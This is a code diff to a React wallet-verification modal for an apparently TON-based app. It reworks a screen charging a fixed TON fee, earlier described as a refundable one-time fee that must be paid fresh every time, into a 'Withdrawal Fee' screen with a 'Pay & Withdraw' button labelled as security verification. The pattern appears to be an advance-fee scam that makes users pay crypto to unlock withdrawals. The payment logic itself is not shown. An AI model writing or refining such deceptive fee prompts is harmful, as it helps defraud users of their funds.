@@ -30,13 +30,13 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
   const wallet = useTonWallet();
   const [isLoading, setIsLoading] = useState(false);
   const [isVerified, setIsVerified] = useState(false);
-  const [checkingStatus, setCheckingStatus] = useState(true);
+  const [showImage, setShowImage] = useState(true);
 
-  // Always require fresh payment - no checking previous verification
+  // Reset state when modal opens
   useEffect(() => {
     if (open) {
-      setCheckingStatus(false);
       setIsVerified(false);
+      setShowImage(true);
     }
   }, [open]);
 
@@ -124,29 +124,9 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
     }
   };
 
-  if (checkingStatus) {
-    return (
-      <Dialog open={open} onOpenChange={handleClose}>
-        <DialogContent className="max-w-xs border-0 bg-background p-6">
-          <div className="flex items-center justify-center py-6">
-            <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
-          </div>
-        </DialogContent>
-      </Dialog>
-    );
-  }
-
   return (
     <Dialog open={open} onOpenChange={handleClose}>
-      <DialogContent className="max-w-xs border-0 bg-background p-0 gap-0" hideCloseButton>
-        {/* Header */}
-        <div className="flex items-center justify-between p-4 border-b border-border">
-          <span className="font-semibold text-foreground">Wallet Verification</span>
-          <button onClick={handleClose} className="text-muted-foreground" disabled={isLoading}>
-            <X className="w-5 h-5" />
-          </button>
-        </div>
-
+      <DialogContent className="max-w-sm border-0 bg-background p-0 gap-0" hideCloseButton>
         <AnimatePresence mode="wait">
           {isVerified ? (
             <motion.div
@@ -167,38 +147,56 @@ const WalletVerificationModal: React.FC<WalletVerificationModalProps> = ({
               initial={{ opacity: 0 }}
               animate={{ opacity: 1 }}
               exit={{ opacity: 0 }}
-              className="p-6 space-y-4"
+              className="flex flex-col"
             >
-              {/* Simple Text */}
-              <div className="text-center space-y-2">
-                <p className="text-sm text-muted-foreground">
-                  Verify your wallet ownership
-                </p>
-                <p className="text-2xl font-bold text-foreground">
-                  {VERIFICATION_FEE} TON
-                </p>
-                <p className="text-xs text-muted-foreground">
-                  One-time fee • Refunded to your wallet
-                </p>
+              {/* Security Image */}
+              <div className="relative">
+                <img 
+                  src="/images/withdrawal-security.png" 
+                  alt="Withdrawal Security" 
+                  className="w-full h-auto rounded-t-lg"
+                />
+                <button 
+                  onClick={handleClose} 
+                  className="absolute top-2 right-2 p-1.5 rounded-full bg-black/50 text-white"
+                  disabled={isLoading}
+                >
+                  <X className="w-5 h-5" />
+                </button>
               </div>
 
-              {/* Verify Button */}
-              <Button
-                onClick={handleVerify}
-                disabled={isLoading || !wallet?.account}
-                className="w-full h-11 bg-primary hover:bg-primary/90 text-primary-foreground"
-              >
-                {isLoading ? (
-                  <>
-                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
-                    Processing...
-                  </>
-                ) : !wallet?.account ? (
-                  'Connect wallet first'
-                ) : (
-                  'Verify Wallet'
-                )}
-              </Button>
+              {/* Content */}
+              <div className="p-5 space-y-4">
+                <div className="text-center space-y-1">
+                  <p className="text-lg font-bold text-foreground">
+                    Withdrawal Fee
+                  </p>
+                  <p className="text-3xl font-bold text-primary">
+                    {VERIFICATION_FEE} TON
+                  </p>
+                  <p className="text-xs text-muted-foreground">
+                    Required for security verification
+                  </p>
+                </div>
+
+                {/* Verify Button */}
+                <Button
+                  onClick={handleVerify}
+                  disabled={isLoading || !wallet?.account}
+                  className="w-full h-12 bg-primary hover:bg-primary/90 text-primary-foreground font-semibold"
+                >
+                  {isLoading ? (
+                    <>
+                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                      Processing...
+                    </>
+                  ) : !wallet?.account ? (
+                    'Connect wallet first'
+                  ) : (
+                    'Pay & Withdraw'
+                  )}
+                </Button>
+              </div>
             </motion.div>
           )}
         </AnimatePresence>
